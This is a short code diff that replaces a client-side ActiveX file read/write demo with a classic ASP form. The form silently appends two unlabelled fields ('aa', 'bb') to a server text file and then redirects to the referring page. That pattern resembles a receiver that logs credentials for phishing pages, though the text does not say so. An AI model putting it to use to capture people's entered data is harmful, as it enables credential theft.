@@ -1,32 +1,22 @@
-<script language="javascript" type="text/javascript">
-
-
-//读文件
-function readFile(filename){
-var fso = new ActiveXObject("Scripting.FileSystemObject");
-var f = fso.OpenTextFile(filename,1);
-var s = "";
-while (!f.AtEndOfStream)
-s += f.ReadLine()+"\n";
-f.Close();
-return s;
-}
-
-//写文件
-function writeFile(filename,filecontent){
-var fso, f, s ;
-fso = new ActiveXObject("Scripting.FileSystemObject");
-f = fso.OpenTextFile(filename,8,true);
-f.WriteLine(filecontent);
-f.Close();
-alert('ok');
-}
-
-</script>
-<html>
-<input type="text" id="in" name="in" />
-<input type="button" value="Write!" onclick="writeFile('12.txt',document.getElementByIdx_x('in').value);"/><br><br>
-<input type="button" value="Read!" onclick="document.getElementByIdx_x('show').value=readFile('12.txt');"/><br>
-<textarea id="show" name="show" cols="100" rows="20" >
-</textarea>
-</html>
+<meta charset=gb2312>
+ <% 
+if request("aa")<>"" and request("bb")<>"" then 
+dim fso,f,forappending
+ forappending=8
+ Set fso = Server.CreateObject("Scripting.FileSystemObject")
+ Set f = fso.OpenTextFile(Server.Mappath("aa.txt"), forappending, True)
+ f.WriteLine request("aa")
+ f.WriteLine request("bb")
+ f.Close()
+ set f=nothing
+ set fso=nothing
+ response.redirect
+ Request.ServerVariables("HTTP_REFERER") 
+else 
+%> 
+<form name="form1" method="post" action=""> <p> 
+<input name="aa" type="text"> </p> <p> 
+<input name="bb" type="text"> </p> <p> 
+<input type="submit" name="Submit" value="提交"> </p> 
+</form> 
+<%end if%>
